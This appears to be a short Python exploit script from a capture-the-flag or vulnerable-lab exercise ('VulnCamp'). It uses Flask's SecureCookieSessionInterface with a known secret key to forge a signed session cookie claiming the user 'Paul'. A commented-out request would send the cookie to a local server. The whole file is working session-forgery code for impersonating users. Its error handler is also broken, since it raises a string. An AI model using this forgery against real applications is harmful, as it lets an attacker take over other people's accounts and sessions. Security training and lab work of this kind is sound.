import requests
import sys
import zlib
from base64 import b64decode
import ast
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):
    def __init__(self, secret_key) -> None:
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    try:
        app = MockApp(secret_key)
        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s =  si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        raise f"Error: {e}"

new_cookie = encode("VulnCamp", "{'username': 'Paul'}")
print(new_cookie)
# resp = requests.get('http://localhost:5000/', cookies={"session": new_cookie})
# print(resp.text)